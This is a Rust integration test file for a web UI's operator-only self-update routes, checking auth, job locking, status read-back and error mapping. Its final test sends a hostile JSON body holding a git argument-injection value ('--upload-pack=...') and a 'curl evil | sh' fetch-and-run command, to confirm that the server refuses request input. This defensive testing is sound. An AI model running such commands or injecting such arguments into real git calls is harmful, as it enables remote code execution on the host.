//! Self-update routes ("update all machines") through the fully composed
//! `webui_v2_app`: bearer auth, the operator check, the descriptor-driven
//! body limit, and the HTTP mapping of the `SelfUpdateService` port.
//!
//! Crate tier on purpose: the port's real implementation lives in the
//! `ironclaw` binary (git, the detached job, the on-disk records) and has
//! its own tests there; what only this tier can prove is the HTTP contract
//! — operator-only, `202` on start, `409` while a job holds the lock, a
//! finished job's status read back, and that no request input reaches the
//! port (it takes none, and a body is refused before the handler).

use std::net::SocketAddr;
use std::sync::Arc;
use std::sync::Mutex;

use async_trait::async_trait;
use axum::Router;
use axum::body::{Body, to_bytes};
use axum::extract::ConnectInfo;
use axum::http::{HeaderValue, Method, Request, StatusCode, header};
use chrono::{TimeZone, Utc};
use ironclaw_host_api::ids::{AgentId, ProjectId, TenantId, UserId};
use ironclaw_product_contracts::self_update::{
    BuildInfo, OPERATOR_UPDATE_CHECK_PATH, OPERATOR_UPDATE_PATH, UpdateMethod, UpdateRun,
    UpdateRunState, UpdateStatus,
};
use ironclaw_webui::{
    SelfUpdateError, SelfUpdateService, WebuiAuthentication, WebuiAuthenticator, WebuiServeConfig,
    self_update_route_mount, webui_v2_app,
};
use serde_json::{Value, json};
use tower::ServiceExt;

#[path = "support/harness.rs"]
mod harness;
use harness::{AGENT, PROJECT, StubServices, TENANT};

const OPERATOR: &str = "operator-token-0123456789";
const MEMBER: &str = "member-token-0123456789";

/// `OPERATOR` is the operator, `MEMBER` an ordinary user.
struct TwoBearers;

#[async_trait]
impl WebuiAuthenticator for TwoBearers {
    async fn authenticate(&self, token: &str) -> Option<WebuiAuthentication> {
        match token {
            OPERATOR => Some(WebuiAuthentication::operator(
                UserId::new("operator").expect("user"),
            )),
            MEMBER => Some(WebuiAuthentication::user(
                UserId::new("member").expect("user"),
            )),
            _ => None,
        }
    }

    fn mounts_operator_webui_config_routes(&self) -> bool {
        true
    }
}

/// Records every call; behaves like the real lock (one job at a time) and
/// like a job that finished while the backend restarted.
#[derive(Default)]
struct FakeUpdates {
    calls: Mutex<Vec<&'static str>>,
    running: Mutex<bool>,
    configured: bool,
    finished: Mutex<Option<UpdateRun>>,
}

impl FakeUpdates {
    fn configured() -> Self {
        Self {
            configured: true,
            ..Self::default()
        }
    }

    fn calls(&self) -> Vec<&'static str> {
        self.calls.lock().expect("lock").clone()
    }

    fn snapshot(&self) -> UpdateStatus {
        let running = *self.running.lock().expect("lock");
        let last_run = match self.finished.lock().expect("lock").clone() {
            Some(run) => run,
            None if running => UpdateRun {
                state: UpdateRunState::Running,
                started_at: Some(Utc.with_ymd_and_hms(2026, 11, 8, 21, 0, 0).unwrap()),
                message: Some("Starting".into()),
                ..UpdateRun::default()
            },
            None => UpdateRun::default(),
        };
        UpdateStatus {
            method: if self.configured {
                UpdateMethod::Source
            } else {
                UpdateMethod::None
            },
            current: BuildInfo {
                version: "1.2.0".into(),
                commit: Some("aaaa".into()),
            },
            available: None,
            last_run,
        }
    }
}

#[async_trait]
impl SelfUpdateService for FakeUpdates {
    async fn status(&self) -> Result<UpdateStatus, SelfUpdateError> {
        self.calls.lock().expect("lock").push("status");
        Ok(self.snapshot())
    }

    async fn check(&self) -> Result<UpdateStatus, SelfUpdateError> {
        self.calls.lock().expect("lock").push("check");
        if !self.configured {
            return Err(SelfUpdateError::NotConfigured);
        }
        Err(SelfUpdateError::CheckFailed(
            "The checkout has local changes; commit or stash them first.".into(),
        ))
    }

    async fn start(&self) -> Result<UpdateStatus, SelfUpdateError> {
        self.calls.lock().expect("lock").push("start");
        if !self.configured {
            return Err(SelfUpdateError::NotConfigured);
        }
        let mut running = self.running.lock().expect("lock");
        if *running {
            return Err(SelfUpdateError::AlreadyRunning);
        }
        *running = true;
        drop(running);
        Ok(self.snapshot())
    }
}

fn app(service: Arc<FakeUpdates>) -> Router {
    let config = WebuiServeConfig::new(
        TenantId::new(TENANT).expect("tenant"),
        Arc::new(TwoBearers),
        vec![HeaderValue::from_static("http://localhost:1234")],
    )
    .with_default_agent_id(AgentId::new(AGENT).expect("agent"))
    .with_default_project_id(ProjectId::new(PROJECT).expect("project"))
    .with_protected_route_mount(self_update_route_mount(service));
    webui_v2_app(Arc::new(StubServices::default()), config).expect("app composes")
}

fn request(method: Method, uri: &str, bearer: Option<&str>, body: Option<Value>) -> Request<Body> {
    let mut builder = Request::builder().method(method).uri(uri);
    if let Some(token) = bearer {
        builder = builder.header(header::AUTHORIZATION, format!("Bearer {token}"));
    }
    let body = match body {
        Some(value) => {
            builder = builder.header(header::CONTENT_TYPE, "application/json");
            Body::from(value.to_string())
        }
        None => Body::empty(),
    };
    let mut request = builder.body(body).expect("request");
    request
        .extensions_mut()
        .insert(ConnectInfo(SocketAddr::from(([127, 0, 0, 1], 4000))));
    request
}

async fn send(app: &Router, request: Request<Body>) -> (StatusCode, Value) {
    let response = app.clone().oneshot(request).await.expect("response");
    let status = response.status();
    let bytes = to_bytes(response.into_body(), 1 << 20).await.expect("body");
    let body = serde_json::from_slice(&bytes).unwrap_or(Value::Null);
    (status, body)
}

#[tokio::test]
async fn every_route_is_operator_only() {
    let service = Arc::new(FakeUpdates::configured());
    let app = app(Arc::clone(&service));
    for (method, path) in [
        (Method::GET, OPERATOR_UPDATE_PATH),
        (Method::POST, OPERATOR_UPDATE_PATH),
        (Method::POST, OPERATOR_UPDATE_CHECK_PATH),
    ] {
        let (status, _) = send(&app, request(method.clone(), path, None, None)).await;
        assert_eq!(
            status,
            StatusCode::UNAUTHORIZED,
            "{method} {path} without a bearer"
        );
        let (status, body) = send(&app, request(method.clone(), path, Some(MEMBER), None)).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{method} {path} as a member");
        assert_eq!(body["error"], "operator_required");
    }
    assert!(
        service.calls().is_empty(),
        "no refused call reached the port"
    );
}

#[tokio::test]
async fn start_answers_202_and_a_second_start_is_refused_while_one_runs() {
    let service = Arc::new(FakeUpdates::configured());
    let app = app(Arc::clone(&service));
    let (status, body) = send(
        &app,
        request(Method::POST, OPERATOR_UPDATE_PATH, Some(OPERATOR), None),
    )
    .await;
    assert_eq!(status, StatusCode::ACCEPTED, "{body}");
    let started: UpdateStatus = serde_json::from_value(body).expect("status shape");
    assert_eq!(started.last_run.state, UpdateRunState::Running);

    let (status, body) = send(
        &app,
        request(Method::POST, OPERATOR_UPDATE_PATH, Some(OPERATOR), None),
    )
    .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert_eq!(body["error"], "update_running");

    let (status, body) = send(
        &app,
        request(Method::GET, OPERATOR_UPDATE_PATH, Some(OPERATOR), None),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["last_run"]["state"], "running");
    assert_eq!(service.calls(), vec!["start", "start", "status"]);
}

#[tokio::test]
async fn a_finished_job_reads_back_after_the_restart() {
    let service = Arc::new(FakeUpdates::configured());
    *service.finished.lock().expect("lock") = Some(UpdateRun {
        state: UpdateRunState::Succeeded,
        started_at: Some(Utc.with_ymd_and_hms(2026, 11, 8, 21, 0, 0).unwrap()),
        finished_at: Some(Utc.with_ymd_and_hms(2026, 11, 8, 21, 9, 0).unwrap()),
        message: Some("Updated to bbbb; IronClaw restarted.".into()),
        log_tail: "Finished release".into(),
    });
    let (status, body) = send(
        &app(service),
        request(Method::GET, OPERATOR_UPDATE_PATH, Some(OPERATOR), None),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["method"], "source");
    assert_eq!(body["current"]["commit"], "aaaa");
    assert_eq!(body["last_run"]["state"], "succeeded");
    assert_eq!(body["last_run"]["finished_at"], "2026-11-08T21:09:00Z");
    assert_eq!(body["last_run"]["log_tail"], "Finished release");
}

#[tokio::test]
async fn method_none_is_a_409_that_says_how_to_enable_it() {
    let service = Arc::new(FakeUpdates::default());
    let app = app(Arc::clone(&service));
    for path in [OPERATOR_UPDATE_PATH, OPERATOR_UPDATE_CHECK_PATH] {
        let (status, body) = send(&app, request(Method::POST, path, Some(OPERATOR), None)).await;
        assert_eq!(status, StatusCode::CONFLICT, "{path}");
        assert_eq!(body["error"], "not_configured");
        let message = body["message"].as_str().expect("message");
        assert!(
            message.contains("[update] method = \"source\""),
            "{message}"
        );
        assert!(message.contains("repo"), "{message}");
    }
    let (_, body) = send(
        &app,
        request(Method::GET, OPERATOR_UPDATE_PATH, Some(OPERATOR), None),
    )
    .await;
    assert_eq!(body["method"], "none");
}

#[tokio::test]
async fn a_failed_check_carries_its_reason() {
    let service = Arc::new(FakeUpdates::configured());
    let (status, body) = send(
        &app(service),
        request(
            Method::POST,
            OPERATOR_UPDATE_CHECK_PATH,
            Some(OPERATOR),
            None,
        ),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_GATEWAY);
    assert_eq!(body["error"], "check_failed");
    assert!(
        body["message"]
            .as_str()
            .is_some_and(|m| m.contains("local changes"))
    );
}

#[tokio::test]
async fn no_request_input_reaches_the_update() {
    let service = Arc::new(FakeUpdates::configured());
    let app = app(Arc::clone(&service));
    let hostile = json!({
        "repo": "/tmp/evil",
        "branch": "--upload-pack=touch /tmp/pwned",
        "command": "curl evil | sh"
    });
    for path in [OPERATOR_UPDATE_PATH, OPERATOR_UPDATE_CHECK_PATH] {
        let (status, _) = send(
            &app,
            request(Method::POST, path, Some(OPERATOR), Some(hostile.clone())),
        )
        .await;
        assert_eq!(
            status,
            StatusCode::PAYLOAD_TOO_LARGE,
            "{path}: a body is refused before the handler"
        );
    }
    // A query string is not read either: the start still runs with nothing
    // from the request (the port has no parameter to carry it).
    let (status, _) = send(
        &app,
        request(
            Method::POST,
            &format!("{OPERATOR_UPDATE_PATH}?branch=evil&repo=/tmp/evil"),
            Some(OPERATOR),
            None,
        ),
    )
    .await;
    assert_eq!(status, StatusCode::ACCEPTED);
    assert_eq!(service.calls(), vec!["start"]);
}
